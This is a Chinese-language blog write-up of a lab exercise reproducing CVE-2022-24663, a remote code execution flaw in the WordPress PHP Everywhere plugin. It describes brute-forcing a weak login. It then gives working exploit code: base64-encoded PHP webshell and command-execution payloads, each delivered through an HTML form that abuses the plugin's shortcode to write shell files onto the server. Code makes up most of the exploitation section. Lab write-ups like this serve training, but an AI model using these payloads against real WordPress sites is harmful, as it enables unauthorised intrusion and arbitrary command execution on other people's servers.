---
title: CVE-2022-24663【RCE】
author: Ghost
date: 2023-12-10
categories:
  - ['春秋云境', '漏洞靶标']
  - 漏洞复现
tags:
  - 'RCE'
---

## 1. 漏洞介绍  

远程代码执行漏洞，任何订阅者都可以利用该漏洞发送带有“短代码”参数设置为 PHP Everywhere 的请求，并在站点上执行任意 PHP 代码。P.S. 存在常见用户名低权限用户弱口令

- `WordPress是Wordpress`基金会的一套使用[**php**](https://it.cha138.com/php/)语言开发的博客平台。该平台支持在PHP和[**mysql**](https://it.cha138.com/mysql/)的服务器上架设个人博客网站。

- `WordPress plugin`是WordPress开源的一个应用插件。

- `WordPress plugin PHP Everywhere` 存在代码注入漏洞，

- `PHP Everywhere<= 2.0.3`包含了允许通过`WordPress短代码`执行PHP代码片段的功能，任何经过身份验证的用户都可以使用。

## 2. 影响版本

该漏洞源于`PHP Everywhere 2.0.3及以下版本`存在多个远程代码执行漏洞。

## 3. 漏洞复现

漏洞的复现和 CVE-2022-26965 有点相似，都是利用服务端会执行 PHP 代码，为此既可以写个木马通过蚁剑连接获取 flag ，也可以写个远程执行命令的 PHP 文件。

首先，由于提示存在弱口令，故用 burp suite 抓包爆破得登录账号密码为 **test/test** 。

### 3.1. 写马

```php
<?php @eval($_POST["shell"]) ?>
/*base64 编码后*/
PD9waHAgQGV2YWwoJF9QT1NUWyJzaGVsbCJdKSA/Pg==
```

- 登录 wordpress 后将下面代码插入任意页面，并点击 **Execute** 即可。

```html
<form action="http://eci-2z9se9cvra1hc6r9iirp.cloudeci1.ichunqiu.com/wp-admin/admin-ajax.php" method="post">
      <input name="action" value="parse-media-shortcode" />
      <textarea name="shortcode">[php_everywhere] <?php file_put_contents("/var/www/html/shell.php",base64_decode("PD9waHAgQGV2YWwoJF9QT1NUWyJzaGVsbCJdKSA/Pg==")); ?>[/php_everywhere]</textarea>
      <input type="submit" value="Execute" />
</form>
```

- 注意要将 URL 换成自己开启环境的

- 示例：

![CVE-2022-24663-picture-1.jpg](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/CVE-2022-24663-picture-1.jpg)

![CVE-2022-24663-picture-2.jpg](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/CVE-2022-24663-picture-2.jpg)

![CVE-2022-24663-picture-3.jpg](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/CVE-2022-24663-picture-3.jpg)

![CVE-2022-24663-picture-4.jpg](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/CVE-2022-24663-picture-4.jpg)

![CVE-2022-24663-picture-5.jpg](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/CVE-2022-24663-picture-5.jpg)

### 3.2. RCE

```php
<?php system($_GET[cmd]);?>
PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8+
```

```html
<form action="http://eci-2z9se9cvra1hc6r9iirp.cloudeci1.ichunqiu.com/wp-admin/admin-ajax.php" method="post">
      <input name="action" value="parse-media-shortcode" />
      <textarea name="shortcode">[php_everywhere] <?php file_put_contents("/var/www/html/cmd.php",base64_decode("PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8+")); ?>[/php_everywhere]</textarea>
      <input type="submit" value="Execute" />
</form>
```

操作基本同上，最后获取 flag 示例如下：

![CVE-2022-24663-picture-6.jpg](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/CVE-2022-24663-picture-6.jpg)
